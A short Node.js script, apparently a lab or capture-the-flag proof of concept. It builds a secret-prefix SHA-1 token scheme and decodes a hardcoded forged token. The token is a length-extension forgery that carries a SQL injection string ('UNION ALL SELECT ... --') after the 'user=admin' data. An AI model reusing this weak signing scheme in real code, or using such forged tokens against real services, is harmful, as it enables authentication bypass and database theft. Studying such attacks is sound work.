const crypto = require("crypto");

const padBase64 = (base64String) => {
    const padLength = (4 - (base64String.length % 4)) % 4;
    return base64String + "=".repeat(padLength);
};

function encode(input, secret) {
    const data = new URLSearchParams(input).toString();
    const signature = crypto
        .createHash("sha1")
        .update(Buffer.concat([Buffer.from(secret), Buffer.from(data)]))
        .digest("base64");
    return (
        Buffer.from(data).toString("base64").split("=").join("") +
        "." +
        signature.split("=").join("")
    );
}
function decode(token, secret) {
    let [b64data, tokenSignature] = token.split(".").map(padBase64);
    const data = Buffer.from(b64data, "base64");
    const signature = crypto
        .createHash("sha1")
        .update(Buffer.concat([Buffer.from(secret), data]))
        .digest("base64");
    // console.log(signature);
    if (tokenSignature != signature) throw new Error("Invalid signature");
    const entries = new URLSearchParams(
        data.toString("utf-8").replace(/[^ -~]/g, "")
    );
    return Object.fromEntries(entries);
}

const secret = "abcd".repeat(32);
var data = {
    "user": "admin"
}
console.log(encode(data, secret));

const forged_token = "dXNlcj1hZG1pboAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEUCcgVU5JT04gQUxMIFNFTEVDVCB0aXRsZSBGUk9NIGJ1Z3MgV0hFUkUgaWQgPSAzIC0t.CuzvlHJBwUSXiiQ6R/VtJ9vlbnk=";
var forged_data = decode(forged_token, secret);
console.log(forged_data);
console.log(forged_data.user);